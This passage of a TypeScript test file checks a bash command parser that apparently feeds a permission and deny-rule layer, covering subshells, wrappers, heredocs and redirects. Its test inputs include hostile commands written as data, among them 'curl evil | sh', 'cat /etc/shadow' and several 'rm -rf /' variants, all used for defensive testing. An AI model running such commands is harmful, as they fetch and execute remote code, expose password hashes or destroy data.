          "if true; then rm y; elif false; then rm z; else rm w; fi",
          ["true", "rm y", "false", "rm z", "rm w"],
        ],
        ["while true; do rm y; done", ["true", "rm y"]],
        ["until true; do rm y; done", ["true", "rm y"]],
        ["select f in a b; do rm $f; done", ["rm $f"]],
        ["for ((i=0; i<3; i++)); do rm $i; done", ["i=0", "rm $i"]],
        ["case /etc/shadow in a) rm y;; b) rm z;; esac", ["rm y", "rm z"]],
        ["myfn() { rm y; }", ["{ rm y; }", "rm y"]],
        ["function myfn { rm y; }", ["{ rm y; }", "rm y"]],
        ["{ rm y; }", ["rm y"]],
        ["! rm y", ["rm y"]],
      ])("descends into %s", async (command, inner) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([
          { text: command },
          ...inner.map((text) => ({ text })),
        ]);
      });

      it("leaves a case subject and its patterns unemitted", async () => {
        // `/etc/shadow` and `a` are operand words, not commands.
        const program = await BashProgram.parse(
          "case /etc/shadow in a) rm y;; esac",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "case /etc/shadow in a) rm y;; esac" },
          { text: "rm y" },
        ]);
      });

      it("leaves a function's own name unemitted", async () => {
        const program = await BashProgram.parse(
          "deploy() { rm y; }",
          normalizer,
        );
        expect(program.commands().map((unit) => unit.text)).not.toContain(
          "deploy",
        );
      });

      it("descends into a substitution in condition position", async () => {
        const program = await BashProgram.parse(
          "if $(rm x); then echo a; fi",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "if $(rm x); then echo a; fi" },
          { text: "$(rm x)" },
          { text: "rm x", context: "command_substitution" },
          { text: "echo a" },
        ]);
      });

      it("relays the enclosing execution context to a compound's commands", async () => {
        const program = await BashProgram.parse(
          "( if true; then rm y; fi )",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "( if true; then rm y; fi )" },
          { text: "if true; then rm y; fi", context: "subshell" },
          { text: "true", context: "subshell" },
          { text: "rm y", context: "subshell" },
        ]);
      });
    });

    it("descends into command substitution, tagging the inner command", async () => {
      const program = await BashProgram.parse("echo $(rm -rf foo)", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo $(rm -rf foo)" },
        { text: "rm -rf foo", context: "command_substitution" },
      ]);
    });

    it("descends into backtick command substitution", async () => {
      const program = await BashProgram.parse("echo `rm x`", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo `rm x`" },
        { text: "rm x", context: "command_substitution" },
      ]);
    });

    it("descends into a pipeline inside command substitution", async () => {
      const program = await BashProgram.parse(
        "echo $(curl evil | sh)",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "echo $(curl evil | sh)" },
        { text: "curl evil", context: "command_substitution" },
        { text: "sh", context: "command_substitution" },
      ]);
    });

    it("descends into process substitution", async () => {
      const program = await BashProgram.parse(
        "diff <(cat /etc/shadow)",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "diff <(cat /etc/shadow)" },
        { text: "cat /etc/shadow", context: "process_substitution" },
      ]);
    });

    it("emits a bare subshell whole and descends into it", async () => {
      const program = await BashProgram.parse("( rm -rf foo )", normalizer);
      expect(program.commands()).toEqual([
        { text: "( rm -rf foo )" },
        { text: "rm -rf foo", context: "subshell" },
      ]);
    });

    it("emits a subshell whole and descends into its chain", async () => {
      const program = await BashProgram.parse("( cd /t && rm x )", normalizer);
      expect(program.commands()).toEqual([
        { text: "( cd /t && rm x )" },
        { text: "cd /t", context: "subshell" },
        { text: "rm x", context: "subshell" },
      ]);
    });

    describe("a subshell timed by time", () => {
      // The grammar has no `time` keyword: `time ( … )` parses as a command
      // named `time` whose argument is the subshell, so the enumerator reads
      // the shape itself and descends it as it descends a bare subshell.
      it("emits the time unit whole and descends into the subshell", async () => {
        const program = await BashProgram.parse(
          "time (rm -rf /tmp/x)",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "time (rm -rf /tmp/x)",
            wrapperKind: "indirection",
            executedUnit: "(rm -rf /tmp/x)",
            floorExemption: "execution-modifier",
          },
          { text: "rm -rf /tmp/x", context: "subshell" },
        ]);
      });

      it("descends into the subshell's pipeline", async () => {
        const program = await BashProgram.parse(
          "time (grep -l foo a | wc -l)",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "time (grep -l foo a | wc -l)",
            wrapperKind: "indirection",
            executedUnit: "(grep -l foo a | wc -l)",
            floorExemption: "execution-modifier",
          },
          { text: "grep -l foo a", context: "subshell" },
          { text: "wc -l", context: "subshell" },
        ]);
      });

      it("emits a substitution inside the subshell once", async () => {
        const program = await BashProgram.parse(
          "time (echo $(rm x))",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "time (echo $(rm x))",
            wrapperKind: "indirection",
            executedUnit: "(echo $(rm x))",
            floorExemption: "execution-modifier",
          },
          { text: "echo $(rm x)", context: "subshell" },
          { text: "rm x", context: "command_substitution" },
        ]);
      });

      it("still emits a substitution in a redirect the command hosts", async () => {
        const program = await BashProgram.parse(
          "2>$(rm y) time (rm x)",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "time (rm x)",
            wrapperKind: "indirection",
            executedUnit: "(rm x)",
            floorExemption: "execution-modifier",
          },
          { text: "rm y", context: "command_substitution" },
          { text: "rm x", context: "subshell" },
        ]);
      });

      it("descends a subshell nested inside the timed one", async () => {
        const program = await BashProgram.parse("time ( (rm x) )", normalizer);
        expect(program.commands()).toEqual([
          {
            text: "time ( (rm x) )",
            wrapperKind: "indirection",
            executedUnit: "( (rm x) )",
            floorExemption: "execution-modifier",
          },
          { text: "(rm x)", context: "subshell" },
          { text: "rm x", context: "subshell" },
        ]);
      });

      it.each(["sudo (rm x)", "nice (rm x)"])(
        "does not descend a subshell another command takes: %s",
        async (command) => {
          // Bash rejects these as syntax errors; only `time` takes a compound.
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([
            {
              text: command,
              wrapperKind: "indirection",
              executedUnit: "(rm x)",
            },
          ]);
        },
      );

      it("leaves a word after the subshell to the unresolved-parse floor", async () => {
        // The grammar wraps `time (rm x)` in an ERROR, emitted whole and floored.
        const program = await BashProgram.parse("time (rm x) y", normalizer);
        expect(program.commands()).toEqual([
          { text: "time (rm x)", parseUnresolved: true },
          { text: "y" },
        ]);
      });

      it("leaves time -p ( … ) to the unresolved-parse floor", async () => {
        const program = await BashProgram.parse("time -p (rm x)", normalizer);
        expect(program.commands()).toEqual([
          {
            text: "time -p (rm x)",
            wrapperKind: "indirection",
            executedUnit: "(rm x)",
            parseUnresolved: true,
          },
        ]);
      });
    });

    it("descends recursively through nested contexts", async () => {
      const program = await BashProgram.parse("echo $( ( rm x ) )", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo $( ( rm x ) )" },
        { text: "( rm x )", context: "command_substitution" },
        { text: "rm x", context: "subshell" },
      ]);
    });

    it("descends into a substitution within a chained command", async () => {
      const program = await BashProgram.parse(
        "cd /p && echo $(rm x)",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "cd /p" },
        { text: "echo $(rm x)" },
        { text: "rm x", context: "command_substitution" },
      ]);
    });

    it("keeps the never-weaker invariant: a benign inner command stays", async () => {
      const program = await BashProgram.parse("echo $(echo safe)", normalizer);
      expect(program.commands()).toEqual([
        { text: "echo $(echo safe)" },
        { text: "echo safe", context: "command_substitution" },
      ]);
    });

    it("returns an empty list for an empty or whitespace command", async () => {
      expect((await BashProgram.parse("", normalizer)).commands()).toEqual([]);
      expect((await BashProgram.parse("   ", normalizer)).commands()).toEqual(
        [],
      );
    });

    it("strips a leading env-var assignment prefix", async () => {
      const program = await BashProgram.parse(
        "AWS_PROFILE=prod aws ec2 terminate-instances --instance-ids i-1",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "aws ec2 terminate-instances --instance-ids i-1" },
      ]);
    });

    it("strips multiple leading env-var assignments", async () => {
      const program = await BashProgram.parse("A=1 B=2 aws s3 ls", normalizer);
      expect(program.commands()).toEqual([{ text: "aws s3 ls" }]);
    });

    it("strips the env-var prefix of each command in a chain", async () => {
      const program = await BashProgram.parse(
        "X=1 aws sts get-caller-identity && ls",
        normalizer,
      );
      expect(program.commands()).toEqual([
        { text: "aws sts get-caller-identity" },
        { text: "ls" },
      ]);
    });

    it("keeps a pure assignment with no command unchanged", async () => {
      const program = await BashProgram.parse("FOO=bar", normalizer);
      expect(program.commands()).toEqual([{ text: "FOO=bar" }]);
    });

    describe("opaque-payload wrappers", () => {
      it.each([
        ['bash -c "rm -rf /"', 'bash -c "rm -rf /"'],
        ['sh -c "rm -rf /"', 'sh -c "rm -rf /"'],
        ['dash -c "rm -rf /"', 'dash -c "rm -rf /"'],
        ['zsh -c "rm -rf /"', 'zsh -c "rm -rf /"'],
        ['ksh -c "rm -rf /"', 'ksh -c "rm -rf /"'],
        ['eval "rm -rf /"', 'eval "rm -rf /"'],
        ['/bin/bash -c "rm -rf /"', '/bin/bash -c "rm -rf /"'],
        ['bash -ec "rm -rf /"', 'bash -ec "rm -rf /"'],
      ])("flags %s as opaque", async (command, text) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([
          {
            text,
            wrapperKind: "opaque-payload",
            executedUnit: "rm -rf /",
            // The path projection reads the payload as a relative path, so
            // the unit carries its absolute spelling; the floor holds anyway.
            spellings: [text.replace('"rm -rf /"', "/projects/my-app/rm -rf ")],
          },
        ]);
      });

      it("flags an env-prefixed wrapper as opaque after stripping the prefix", async () => {
        const program = await BashProgram.parse(
          'AWS_PROFILE=prod bash -c "rm -rf /"',
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: 'bash -c "rm -rf /"',
            wrapperKind: "opaque-payload",
            executedUnit: "rm -rf /",
            spellings: ["bash -c /projects/my-app/rm -rf "],
          },
        ]);
      });

      it.each(["bash script.sh", "bash", "ls -la", "grep -c foo file"])(
        "does not flag %s as opaque",
        async (command) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([{ text: command }]);
        },
      );
    });

    describe("indirection wrappers", () => {
      it.each([
        ["sudo aws s3 ls", "sudo aws s3 ls", "aws s3 ls"],
        ["env FOO=bar aws s3 ls", "env FOO=bar aws s3 ls", "aws s3 ls"],
        ["xargs rm -rf", "xargs rm -rf", "rm -rf"],
        ["nohup aws s3 ls", "nohup aws s3 ls", "aws s3 ls"],
        ["/usr/bin/sudo aws s3 ls", "/usr/bin/sudo aws s3 ls", "aws s3 ls"],
        // Exec-capable rewrites and prefix wrappers (#575).
        ["parallel rm ::: x", "parallel rm ::: x", "rm ::: x"],
        ["doas aws s3 ls", "doas aws s3 ls", "aws s3 ls"],
        ["flock /tmp/lock aws s3 ls", "flock /tmp/lock aws s3 ls", "aws s3 ls"],
        // A command line handed to a shell or built from a template is never
        // exempt, however core its first word looks.
        ["rust-parallel echo", "rust-parallel echo", "echo"],
        ["rush echo", "rush echo", "echo"],
        ["watch ls", "watch ls", "ls"],
      ])(
        "flags %s as an indirection wrapper",
        async (command, text, executedUnit) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([
            { text, wrapperKind: "indirection", executedUnit },
          ]);
        },
      );

      // Wrappers that change only how the command runs, so the unit inherits
      // the inner command's verdict rather than flooring (#963).
      it.each([
        ["time aws s3 ls", "aws s3 ls"],
        ["timeout 10 aws s3 ls", "aws s3 ls"],
        ["nice -n 10 aws s3 ls", "aws s3 ls"],
        ["setsid aws s3 ls", "aws s3 ls"],
        ["stdbuf -oL aws s3 ls", "aws s3 ls"],
      ])(
        "flags %s as an indirection wrapper that only modifies execution",
        async (command, executedUnit) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([
            {
              text: command,
              wrapperKind: "indirection",
              executedUnit,
              floorExemption: "execution-modifier",
            },
          ]);
        },
      );

      it("flags an env-prefixed indirection wrapper after stripping the prefix", async () => {
        const program = await BashProgram.parse(
          "AWS_PROFILE=prod sudo aws s3 ls",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "sudo aws s3 ls",
            wrapperKind: "indirection",
            executedUnit: "aws s3 ls",
          },
        ]);
      });

      it.each(["aws s3 ls", "ls -la", "grep -n foo file"])(
        "does not flag %s as an indirection wrapper",
        async (command) => {
          const program = await BashProgram.parse(command, normalizer);
          expect(program.commands()).toEqual([{ text: command }]);
        },
      );
    });

    describe("exec-conditional wrappers (find/fd)", () => {
      it.each([
        ["find . -exec rm {} \\;", "rm {}"],
        ["find . -execdir rm {} \\;", "rm {}"],
        ["find . -ok rm {} \\;", "rm {}"],
        ["find . -okdir rm {} \\;", "rm {}"],
        ["fd -x rm", "rm"],
        ["fd --exec rm", "rm"],
        ["fd -X rm", "rm"],
        ["fd --exec-batch rm", "rm"],
      ])(
        "flags %s as an indirection wrapper",
        async (command, executedUnit) => {
          const program = await BashProgram.parse(command, normalizer);
          // `find`'s `.` resolves to the working directory.
          const spellings = command.startsWith("find .")
            ? { spellings: [command.replace(".", "/projects/my-app")] }
            : {};
          expect(program.commands()).toEqual([
            {
              text: command,
              wrapperKind: "indirection",
              executedUnit,
              ...spellings,
            },
          ]);
        },
      );

      it.each([
        ["find . -name foo", ["find /projects/my-app -name foo"]],
        ["fd pattern", undefined],
        ["fd -H -t f pattern", undefined],
      ])("does not flag a bare %s search", async (command, spellings) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()).toEqual([
          spellings === undefined
            ? { text: command }
            : { text: command, spellings },
        ]);
      });
    });

    describe("executed unit", () => {
      it.each([
        ['bash -c "rm -rf /"', "rm -rf /"],
        ["sudo aws s3 rm", "aws s3 rm"],
        ["sudo -u root aws s3 rm", "aws s3 rm"],
        ["timeout 10 grep foo", "grep foo"],
        ["timeout -- 5 sudo rm x", "rm x"],
        ["timeout -s KILL -- 5 rm x", "rm x"],
        ["find . -name x -exec grep foo {} \\;", "grep foo {}"],
        ["sudo timeout 5 xargs grep foo", "grep foo"],
      ])("names what %s actually runs", async (command, executedUnit) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(program.commands()[0].executedUnit).toBe(executedUnit);
      });

      it("is absent for an ordinary command", async () => {
        const program = await BashProgram.parse("grep foo", normalizer);
        expect(program.commands()).toEqual([{ text: "grep foo" }]);
      });

      it("is absent when the wrapper names no inner command", async () => {
        const program = await BashProgram.parse("xargs", normalizer);
        expect(program.commands()).toEqual([
          { text: "xargs", wrapperKind: "indirection" },
        ]);
      });
    });

    describe("floor exemption", () => {
      /** The exemption recorded for each unit of a parsed command. */
      async function exemptions(
        command: string,
      ): Promise<(string | undefined)[]> {
        const program = await BashProgram.parse(command, normalizer);
        return program.commands().map((unit) => unit.floorExemption);
      }

      it.each([
        "xargs grep foo",
        "xargs -0 rg pattern",
        "find . -name '*.ts' -exec wc -l {} +",
        "sudo timeout 5 xargs grep foo",
        "xargs sed -n p",
        "find . -name '*.md' -exec sed -n 1p {} +",
        "xargs awk '{print}'",
      ])("exempts %s", async (command) => {
        await expect(exemptions(command)).resolves.toEqual(["core-reader"]);
      });

      it.each([
        ["xargs pnpm test", "the inner command is not in the core"],
        ["xargs -I{} sh -c 'grep -l x {}'", "the payload is not re-parsed"],
        ["find . -exec sh -c 'grep x' \\;", "the payload is not re-parsed"],
        ["xargs sort -o /tmp/x", "`-o` withdraws sort's read claim"],
        ["xargs sed -i s/a/b/", "`-i` withdraws sed's read claim"],
        ["xargs sed 'w out'", "a `w` command withdraws sed's read claim"],
        ["xargs awk -f p.awk", "`-f` withdraws awk's read claim"],
      ])("does not exempt %s (%s)", async (command) => {
        await expect(exemptions(command)).resolves.toEqual([undefined]);
      });

      it("exempts an execution modifier whose statement redirects to a file", async () => {
        await expect(
          exemptions("time pnpm run lint >/tmp/lintout.txt 2>&1"),
        ).resolves.toEqual(["execution-modifier"]);
      });

      it("exempts a timed subshell, whose commands are units of their own", async () => {
        await expect(exemptions("time (rm -rf /tmp/x)")).resolves.toEqual([
          "execution-modifier",
          undefined,
        ]);
      });

      it.each([
        ["timeout --sig KILL 5 rm -rf /", "an abbreviation hides its value"],
        ["time sudo rm -rf x", "a peeled layer changes who runs it"],
        ["timeout {5,sudo} rm x", "brace expansion adds a word"],
        ["timeout $D rm x", "an unquoted expansion may split"],
        ['timeout "$D" rm x', "a computed operand is not proven"],
        ["timeout $(echo 5 sudo) rm x", "a substitution may split"],
        ["timeout * rm x", "a glob may expand to several words"],
        ["nice -n $N rm x", "an option value may split"],
        ["nice -n$N rm x", "an attached value may split"],
        ["stdbuf -o$M rm x", "an attached value may split"],
      ])("does not exempt the modifier unit of %s (%s)", async (command) => {
        const [first] = await exemptions(command);
        expect(first).toBeUndefined();
      });

      it("does not exempt a brace group after time", async () => {
        // The grammar has no `time` keyword: the group's words become the
        // `time` unit's arguments and the closing brace a unit of its own,
        // so the group is not recovered and keeps the floor (#1043).
        await expect(exemptions("time { rm -rf /tmp/x; }")).resolves.toEqual([
          undefined,
          undefined,
        ]);
      });

      describe("a withdrawing option spelled with quotes", () => {
        // The shell removes the quotes before the program sees the option, so
        // the core must read the same resolved word the program receives.
        it.each([
          "xargs find . '-delete'",
          'xargs find . "-delete"',
          "xargs sort '-o' /tmp/x",
          "xargs fd foo '--exec' rm",
        ])("does not exempt %s", async (command) => {
          await expect(exemptions(command)).resolves.toEqual([undefined]);
        });

        it("does not exempt a computed word that may spell a withdrawing option", async () => {
          await expect(exemptions("xargs find . $A")).resolves.toEqual([
            undefined,
          ]);
        });

        it("still exempts a computed word behind a literal", async () => {
          await expect(
            exemptions("xargs find packages/*/docs"),
          ).resolves.toEqual(["core-reader"]);
        });

        it("still exempts a quoted argument that withdraws nothing", async () => {
          await expect(exemptions("xargs grep 'foo'")).resolves.toEqual([
            "core-reader",
          ]);
        });
      });

      it("is absent for a command that is not a wrapper", async () => {
        await expect(exemptions("grep foo")).resolves.toEqual([undefined]);
      });

      describe("a statement that writes through a redirect", () => {
        it("withholds the exemption from the redirected wrapper", async () => {
          await expect(exemptions("xargs grep foo > out.txt")).resolves.toEqual(
            [undefined],
          );
        });

        it.each([">>", ">|", "&>"])(
          "withholds it for a %s redirect too",
          async (operator) => {
            await expect(
              exemptions(`xargs grep foo ${operator} out.txt`),
            ).resolves.toEqual([undefined]);
          },
        );

        it("withholds it from every unit of a redirected pipeline", async () => {
          // The redirect applies to the last element, but it hangs off the whole
          // pipeline in the parse tree. Over-attributing is the fail-closed
          // direction: the flag can only ever withhold an exemption.
          await expect(
            exemptions("cat a | xargs grep b > out"),
          ).resolves.toEqual([undefined, undefined]);
        });

        it("withholds it from a redirected subshell's commands", async () => {
          await expect(exemptions("( xargs grep foo ) > out")).resolves.toEqual(
            [undefined, undefined],
          );
        });

        it("withholds it from a redirected compound statement's commands", async () => {
          // A compound statement's body runs in the current shell, so the
          // enclosing statement's write reaches every unit beneath it — the
          // scope is relayed unchanged rather than restarted (#742).
          await expect(
            exemptions("if true; then xargs grep -l x; fi > out.txt"),
          ).resolves.toEqual([undefined, undefined, undefined]);
        });

        it.each([
          ["xargs grep foo > $OUT", "an unquoted variable"],
          ["xargs grep foo >${OUT}", "a brace expansion"],
          ["xargs grep foo > ${DIR}/log", "an expansion plus a literal"],
        ])(
          "withholds it for a destination named by %s (%s)",
          async (command) => {
            // The destination is chosen at run time, so the parse cannot say
            // which file it is — and it is invisible to the path projection too
            // (#609), which makes the floor the only guard that ever covered it.
            await expect(exemptions(command)).resolves.toEqual([undefined]);
          },
        );

        it("withholds it for a command-substitution destination", async () => {
          // Two units: the wrapper, and the `mktemp` hosted in the destination.
          await expect(
            exemptions("xargs grep foo > $(mktemp)"),
          ).resolves.toEqual([undefined, undefined]);
        });
      });

      describe("a redirect hosted inside the command", () => {
        it("withholds the exemption when it writes", async () => {
          await expect(exemptions(">/tmp/o xargs grep foo")).resolves.toEqual([
            undefined,
          ]);
        });

        it("keeps the exemption for a descriptor duplication", async () => {
          await expect(exemptions("2>&1 xargs grep foo")).resolves.toEqual([
            "core-reader",
          ]);
        });

        it("keeps it when a word follows a descriptor duplication", async () => {
          // `~/x` is `ls`'s operand, not a file `2>&1` writes.
          await expect(
            exemptions("rg -l x | xargs ls -1t 2>&1 ~/x"),
          ).resolves.toEqual([undefined, "core-reader"]);
        });
      });

      describe("a redirect that writes no file", () => {
        it("keeps the exemption for a descriptor duplication", async () => {
          await expect(exemptions("xargs grep foo 2>&1")).resolves.toEqual([
            "core-reader",
          ]);
        });

        it("keeps the exemption for an input redirect", async () => {
          await expect(exemptions("xargs grep foo < in.txt")).resolves.toEqual([
            "core-reader",
          ]);
        });
      });

      describe("a statement that redirects to the discard device", () => {
        it.each([
          ["rg -l x | xargs ls -1t 2>/dev/null", [undefined, "core-reader"]],
          ["xargs grep -l x >/dev/null 2>&1", ["core-reader"]],
          ["2>/dev/null xargs grep -l x", ["core-reader"]],
        ])("keeps the exemption for %s", async (command, expected) => {
          await expect(exemptions(command)).resolves.toEqual(expected);
        });

        it.each([
          ["xargs grep x 2>/dev/null > out.txt", "another redirect writes"],
          ["xargs grep -l x 2>/dev/stdout", "a stream device reopens its file"],
          ['xargs grep -l x 2>"/dev/null"', "a quoted spelling stays unproven"],
          [
            "xargs pnpm test 2>/dev/null",
            "the inner command is not in the core",
          ],
        ])("withholds it for %s (%s)", async (command) => {
          await expect(exemptions(command)).resolves.toEqual([undefined]);
        });
      });

      it("gives a nested execution its own scope", async () => {
        // The redirect belongs to the enclosing statement, not to the command
        // substitution hosted in its destination.
        await expect(
          exemptions("echo hi > $(xargs grep foo)"),
        ).resolves.toEqual([undefined, "core-reader"]);
      });
    });

    describe("units from a parse tree-sitter could not resolve (#840)", () => {
      it("marks a command the failure reaches only through its statement", async () => {
        // The reported shape: valid bash (`bash -n` accepts it) that the
        // grammar cannot parse, because a heredoc redirect combines with
        // `2>&1` and a pipe. The `ERROR` is three levels below the statement,
        // under `heredoc_redirect → file_redirect`, and both command nodes are
        // themselves clean — the `list` holding them relays the statement's
        // scope, so the failure reaches them both.
        const program = await BashProgram.parse(
          "git add -A . && git commit -F - <<'MSG' 2>&1 | rm -rf /tmp/x\nmsg\nMSG",
          normalizer,
        );
        expect(program.commands()).toEqual([
          {
            text: "git add -A .",
            parseUnresolved: true,
            spellings: ["git add -A /projects/my-app"],
          },
          { text: "git commit -F", parseUnresolved: true },
          { text: "rm -rf /tmp/x", parseUnresolved: true, salvaged: true },
          { text: "git add -A .", parseUnresolved: true, salvaged: true },
          { text: "git commit -F", parseUnresolved: true, salvaged: true },
          { text: "rm -rf /tmp/x", parseUnresolved: true, salvaged: true },
        ]);
      });

      it("leaves a statement beside the failed one unmarked", async () => {
        // The precision the per-statement rule buys over a program-level one:
        // `rm -rf /tmp/y` is a sibling of the failed `redirected_statement`,
        // not beneath it, so its own rule still decides it.
        const program = await BashProgram.parse(
          "echo hi > out.txt <> rw.txt; rm -rf /tmp/y",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "echo hi", parseUnresolved: true },
          { text: "rm -rf /tmp/y" },
        ]);
      });

      it.each([
        ["a chain", "cd /repo && git push"],
        ["a pipeline", "echo hi | tail -2"],
        ["a redirect", "cat a > out.txt"],
        ["a loop", "for f in a b; do rm $f; done"],
      ])("marks nothing in %s that parses cleanly", async (_label, command) => {
        const program = await BashProgram.parse(command, normalizer);
        for (const unit of program.commands()) {
          expect(unit.parseUnresolved).toBeUndefined();
        }
      });
    });

    describe("a command the parse dropped entirely (#875)", () => {
      it("enumerates the piped command the recovery left in no unit", async () => {
        // Before the salvage this command enumerated `git add -A .` and
        // `git commit -F` only, so `bash: {"rm -rf *": "deny"}` was never
        // evaluated against a command `bash -n` accepts and the shell runs.
        const program = await BashProgram.parse(
          "git add -A . && git commit -F - <<'MSG' 2>&1 | rm -rf /tmp/x\nmsg\nMSG",
          normalizer,
        );
        expect(program.commands()).toContainEqual({
          text: "rm -rf /tmp/x",
          parseUnresolved: true,
          salvaged: true,
        });
      });

      it("appends the salvaged unit after the units the primary parse produced", async () => {
        const program = await BashProgram.parse(
          "cat <<'MSG' 2>&1 | tail -4\nmsg\nMSG",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "cat", parseUnresolved: true },
          { text: "tail -4", parseUnresolved: true, salvaged: true },
          { text: "cat", parseUnresolved: true, salvaged: true },
          { text: "tail -4", parseUnresolved: true, salvaged: true },
        ]);
      });

      it("flags a salvaged indirection wrapper like any other", async () => {
        // The salvaged root goes through the ordinary enumeration, so the
        // wrapper floor reaches it without a second vocabulary.
        const program = await BashProgram.parse(
          "cat <<'MSG' 2>&1 | sudo rm -rf /\nmsg\nMSG",
          normalizer,
        );
        const salvagedWrapper = {
          text: "sudo rm -rf /",
          wrapperKind: "indirection",
          executedUnit: "rm -rf /",
          parseUnresolved: true,
          salvaged: true,
        };
        expect(program.commands()).toEqual([
          { text: "cat", parseUnresolved: true },
          salvagedWrapper,
          { text: "cat", parseUnresolved: true, salvaged: true },
          salvagedWrapper,
        ]);
      });

      it("salvages nothing from a region whose own re-parse fails", async () => {
        // The `<>` shapes (#814): recovery's invented structure does not
        // re-parse, so no fragment is admitted as a command.
        const program = await BashProgram.parse("cat <> rw.txt", normalizer);
        expect(program.commands()).toEqual([
          { text: "cat", parseUnresolved: true },
        ]);
      });
    });

    describe("a heredoc tail the grammar cannot parse", () => {
      it.each([
        ["a `;` command", "cat <<EOF ; rm -rf x"],
        ["an `&` command", "cat <<EOF & rm -rf x"],
        ["a descriptor-prefixed heredoc", "cat 2<<EOF ; rm -rf x"],
      ])("enumerates the command after %s", async (_label, line) => {
        // Before, only `cat` was enumerated, so `bash: {"rm *": "deny"}` was
        // never consulted for a command `bash -n` accepts and the shell runs.
        const program = await BashProgram.parse(`${line}\nb\nEOF`, normalizer);
        expect(program.commands()).toEqual([
          { text: "cat", parseUnresolved: true },
          { text: "cat", parseUnresolved: true, salvaged: true },
          { text: "rm -rf x", parseUnresolved: true, salvaged: true },
        ]);
      });

      it("enumerates the command after a descriptor the grammar lexed into the delimiter", async () => {
        const program = await BashProgram.parse(
          "cat 0<<EOF | rm -rf x\nb\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "cat" },
          { text: "0<<EOF | rm -rf x\nb\nEOF", parseUnresolved: true },
          { text: "cat", parseUnresolved: true, salvaged: true },
          { text: "rm -rf x", parseUnresolved: true, salvaged: true },
        ]);
      });

      it("gives the words after the heredoc to its command", async () => {
        const program = await BashProgram.parse(
          "cat <<EOF arg > /tmp/o\nb\nEOF",
          normalizer,
        );
        expect(program.commands()).toEqual([
          { text: "cat", parseUnresolved: true },
          { text: "cat arg", parseUnresolved: true, salvaged: true },
        ]);
      });

      it("enumerates the command after a heredoc inside a compound statement", async () => {
        const program = await BashProgram.parse(
          "if true; then cat <<EOF ; rm x\nb\nEOF\nfi",
          normalizer,
        );
        expect(program.commands()).toContainEqual({
          text: "rm x",
          parseUnresolved: true,
          salvaged: true,
        });
      });
    });
  });

  it("derives both slices from a single parse", async () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );
    const program = await BashProgram.parse("cat .env /etc/hosts", normalizer);
    expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
      ".env",
      "/etc/hosts",
    ]);
    const external = program.externalAccesses().map(({ path }) => path.value());
    expect(external).toContain("/etc/hosts");
    expect(external).not.toContain(".env");
  });

  describe("workdir seed (#574)", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    it("flags an absolute workdir outside cwd as an external path", async () => {
      const program = await BashProgram.parse("echo hi", normalizer, {
        workdir: "/etc",
      });
      expect(
        program.externalAccesses().map(({ path }) => path.value()),
      ).toContain("/etc");
    });

    it("resolves a relative token against the workdir base", async () => {
      const program = await BashProgram.parse("cat ../secret.txt", normalizer, {
        workdir: "/etc",
      });
      const external = program
        .externalAccesses()
        .map(({ path }) => path.value());
      // ../secret.txt resolves against /etc, not cwd.
      expect(external).toContain("/secret.txt");
      expect(external).toContain("/etc");
    });

    it("keeps an absolute token base-independent under a workdir", async () => {
      const program = await BashProgram.parse(
        "cat /var/log/syslog",
        normalizer,
        { workdir: "/etc" },
      );
      const external = program
        .externalAccesses()
        .map(({ path }) => path.value());
      expect(external).toContain("/var/log/syslog");
      expect(external).not.toContain("/etc/var/log/syslog");
    });

    it("does not flag a workdir inside cwd, and resolves relative tokens under it", async () => {
      const program = await BashProgram.parse("cat ../secret.txt", normalizer, {
        workdir: "sub",
      });
      // ../secret.txt from cwd/sub resolves back to cwd/secret.txt (internal),
      // and the workdir sub is inside cwd — nothing is external.
      expect(program.externalAccesses()).toEqual([]);
    });

    it("resolves a relative path-rule candidate against the workdir base", async () => {
      const program = await BashProgram.parse("cat sub/file.txt", normalizer, {
        workdir: "/work",
      });
      const candidate = program
        .pathRuleCandidates()
        .find(({ token }) => token === "sub/file.txt");
      expect(candidate?.path.matchValues()).toContain("/work/sub/file.txt");
    });

    it("reproduces cwd-based resolution when no workdir is given", async () => {
      const program = await BashProgram.parse("cat ../secret.txt", normalizer);
      // ../secret.txt from cwd resolves against the parent of cwd.
      expect(
        program.externalAccesses().map(({ path }) => path.value()),
      ).toContain("/projects/secret.txt");
    });

    it("applies Git Bash drive-mount semantics to a win32 workdir", async () => {
      const win = new PathNormalizer(win32PathFlavor, "C:\\projects\\app");
      const program = await BashProgram.parse("echo hi", win, {
        workdir: "/c/work",
      });
      // /c/work is the MSYS mount for C:\work — outside the cwd, so flagged.
      const external = program
        .externalAccesses()
        .map(({ path }) => path.value());
